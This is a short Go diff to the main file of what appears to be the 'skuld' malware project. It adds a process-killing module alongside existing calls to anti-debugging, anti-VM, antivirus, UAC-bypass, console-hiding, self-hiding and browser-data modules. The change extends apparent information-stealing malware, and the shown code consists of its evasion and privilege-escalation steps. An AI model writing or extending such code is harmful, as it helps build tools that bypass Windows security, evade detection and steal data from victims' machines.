@@ -2,6 +2,7 @@ package main
 
 import (
 	"github.com/hackirby/skuld/modules/antidebug"
+	"github.com/hackirby/skuld/modules/processkill"
 	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
 	"github.com/hackirby/skuld/modules/browsers"
@@ -44,7 +45,8 @@ func main() {
 	}
 
 	uacbypass.Run()
-
+	processkill.Run()
+	
 	hideconsole.Run()
 	program.HideSelf()
 
